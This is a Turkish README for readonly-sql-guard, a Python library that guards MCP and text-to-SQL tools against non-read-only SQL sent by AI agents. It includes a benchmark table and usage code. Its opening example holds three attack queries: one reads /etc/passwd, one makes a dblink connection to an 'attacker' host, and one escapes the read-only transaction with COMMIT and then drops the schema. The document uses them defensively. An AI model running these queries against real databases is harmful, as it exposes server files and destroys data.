# readonly-sql-guard

**AI ajanları için kanıtlanabilir salt-okunur bir SQL bekçisi — herhangi bir MCP sunucusuna ya da veritabanı aracına tak.**

🇬🇧 English: [README.md](README.md)

Çoğu veritabanı MCP sunucusu ve text-to-SQL aracı "salt-okunur"u ifadenin **şekline** bakarak uygular — `SELECT` ile mi başlıyor? İçinde `DELETE` var mı? Bu yeterli değil. Kusursuz bir `SELECT` bir dosya okuyabilir, soket açabilir, shell çalıştırabilir, salt-okunur bir transaction'dan kaçabilir veya oturumu değiştirebilir:

```sql
SELECT pg_read_file('/etc/passwd')                       -- sunucu dosyası okur
SELECT * FROM dblink('host=attacker','SELECT 1') AS t(x int)  -- dışarı bağlanır
COMMIT; DROP SCHEMA public CASCADE;                      -- salt-okunur transaction'dan kaçar
```

Bu ilk vakalar, gerçek MCP sunucularında [Anthropic'in referans Postgres sunucusunu arşivletti](https://github.com/modelcontextprotocol/servers-archived/tree/HEAD/src/postgres) ve Supabase MCP'sini ders kitabı ["lethal trifecta"](https://simonwillison.net/2025/Jul/6/supabase-mcp-lethal-trifecta/) vakası yaptı. Bu kütüphane ifadenin **çağırdığı** fonksiyonları denetler, sadece şeklini değil — ve bunu kanıtlar.

## Burada salt-okunur bir sıfat değil, bir sayı

`readonly-sql-guard benchmark` 28 kusursuz-SQL saldırısını (ikisi yukarıdakiler) ve 8 meşru okumayı çalıştırır; aynı korpusu diğer araçların kullandığı kestirmelerden de geçirir:

| Bekçi | Reddedilen saldırı | Serbest bırakılan meşru okuma |
|---|---|---|
| `SELECT` ile başlıyor mu | **6 / 28** | 8 / 8 |
| yazma-anahtarkelime kara listesi | **9 / 28** | 7 / 8 *("delete" string içinde geçen okumayı bloklar)* |
| **bu bekçi** | **28 / 28** | **8 / 8** |

Kendi saldırını [tarayıcıdaki oyun alanına](https://gulmezeren2-byte.github.io/erp-report-engine/playground.html) yapıştır.

![readonly-sql-guard benchmark çıktısı: 28 iyi-biçimli SQL saldırısının tamamı reddedildi — COMMIT; DROP işlem kaçışı ve Supabase 'lethal trifecta' yazma ayağı dahil — ve 8 meşru okumanın tamamı serbest bırakıldı; yanında yalnız-şekle bakan kontrollerin 6/28 ve 9/28 skorları](https://raw.githubusercontent.com/gulmezeren2-byte/readonly-sql-guard/main/docs/assets/benchmark.png)

*Tüm benchmark, tek komut, veritabanı gerekmez: `readonly-sql-guard benchmark`.*

## Kurulum & Kullanım

```bash
pip install readonly-sql-guard
```

```python
from readonly_sql_guard import assert_read_only, ReadOnlyViolation

assert_read_only("SELECT * FROM orders", dialect="postgres")           # döner (okuma)
assert_read_only("SELECT pg_read_file('/x')", dialect="postgres")      # ReadOnlyViolation

# Sizin yazmadığınız SQL için (ajan/kullanıcı) katı mod — parser'ın tanımadığı her fonksiyonu da reddeder:
assert_read_only(ajan_sql, dialect="postgres", strict=True)
```

## Nereden geliyor

Bu, [**erp-report-engine**](https://github.com/gulmezeren2-byte/erp-report-engine)'in salt-okunur bekçisinin, herhangi bir araç benimseyebilsin diye genelleştirilmiş hâlidir. O proje amiral örnek; bu ise yeniden-kullanılabilir çekirdek.

## Lisans

MIT © Eren Gülmez
